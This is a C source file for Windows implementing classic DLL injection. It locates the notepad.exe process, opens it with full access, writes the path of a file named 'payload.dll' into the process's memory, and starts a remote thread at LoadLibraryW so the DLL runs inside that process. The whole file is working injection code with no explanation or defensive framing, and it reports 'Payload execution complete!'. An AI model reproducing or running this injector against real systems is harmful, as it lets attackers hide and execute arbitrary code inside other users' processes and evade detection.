#include <Windows.h>
#include <stdio.h>
#include <Tlhelp32.h>

BOOL InjectLibraryIntoProcess(HANDLE processHandle, LPWSTR libraryName) {

    BOOL resultState = TRUE;
    LPVOID kernelLoadLibraryW = NULL;
    LPVOID allocatedMemory = NULL;
    DWORD sizeOfLibraryName = lstrlenW(libraryName) * sizeof(WCHAR);
    SIZE_T bytesWritten = NULL;
    HANDLE remoteThread = NULL;

    kernelLoadLibraryW = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
    if (kernelLoadLibraryW == NULL) {
        resultState = FALSE;
        goto Cleanup;
    }

    allocatedMemory = VirtualAllocEx(processHandle, NULL, sizeOfLibraryName, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (allocatedMemory == NULL) {
        resultState = FALSE;
        goto Cleanup;
    }

    printf("Memory Allocated At : 0x%p Of Size : %d\n", allocatedMemory, sizeOfLibraryName);
    //getchar();

    if (!WriteProcessMemory(processHandle, allocatedMemory, libraryName, sizeOfLibraryName, &bytesWritten) || bytesWritten != sizeOfLibraryName) {
        resultState = FALSE;
        goto Cleanup;
    }

    printf("Successfully written %d bytes!!\n", bytesWritten);
    //getchar();

    remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)kernelLoadLibraryW, allocatedMemory, 0, NULL);
    if (remoteThread == NULL) {
        resultState = FALSE;
        goto Cleanup;
    }
    printf("Payload execution complete!\n");

Cleanup:
    if (remoteThread)
        CloseHandle(remoteThread);
    return resultState;
}


BOOL RetrieveProcessHandle(LPWSTR targetProcessName, DWORD* processId, HANDLE* handleOfProcess) {
    HANDLE snapshotHandle = NULL;
    PROCESSENTRY32 processEntry;
    processEntry.dwSize = sizeof(PROCESSENTRY32);

    snapshotHandle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    if (snapshotHandle == INVALID_HANDLE_VALUE) {
        printf("CreateToolhelp32Snapshot Failed With Error : %d \n", GetLastError());
        goto Finish;
    }

    if (!Process32First(snapshotHandle, &processEntry)) {
        printf("Process32First Failed With Error : %d \n", GetLastError());
        goto Finish;
    }
 
    do {
        WCHAR lowerCaseName[MAX_PATH * 2];
        if (processEntry.szExeFile) {
            DWORD length = lstrlenW(processEntry.szExeFile);
            DWORD i = 0;
            RtlSecureZeroMemory(lowerCaseName, MAX_PATH * 2);
            if (length < MAX_PATH * 2) {
                for (; i < length; i++)
                    lowerCaseName[i] = (WCHAR)tolower(processEntry.szExeFile[i]);
                lowerCaseName[i++] = '\0';
            }
        }

        if (wcscmp(lowerCaseName, targetProcessName) == 0) {
            *processId = processEntry.th32ProcessID;
            *handleOfProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processEntry.th32ProcessID);
            if (*handleOfProcess == NULL)
                printf("OpenProcess Failed With Error : %d \n", GetLastError());
            break;
        }
    } while (Process32Next(snapshotHandle, &processEntry));

Finish:
    if (snapshotHandle != NULL)
        CloseHandle(snapshotHandle);
    if (*processId == NULL || *handleOfProcess == NULL)
        return FALSE;
    return TRUE;
}

int InjectDLL() {

    HANDLE targetProcessHandle = NULL;
    DWORD targetProcessId = NULL;

   
    wchar_t exePath[MAX_PATH];
    GetModuleFileName(NULL, exePath, MAX_PATH);

    wchar_t* lastSlash = wcsrchr(exePath, L'\\');
    if (lastSlash != NULL) {
        *lastSlash = L'\0';
    }

    wchar_t dllPath[MAX_PATH];
    swprintf(dllPath, MAX_PATH, L"%s\\payload.dll", exePath);


    wchar_t processName[] = L"notepad.exe";

    wprintf(L"Searching for process ID of \"%s\" ... ", processName);
    if (!RetrieveProcessHandle(processName, &targetProcessId, &targetProcessHandle)) {
        printf("Process Not Found \n");
        return -1;
    }
    wprintf(L"Search Complete \n");

    printf("Target process PID: %d \n", targetProcessId);
    if (!InjectLibraryIntoProcess(targetProcessHandle, dllPath)) {
        return -1;
    }

    CloseHandle(targetProcessHandle);
    //getchar();
    return 0;
}
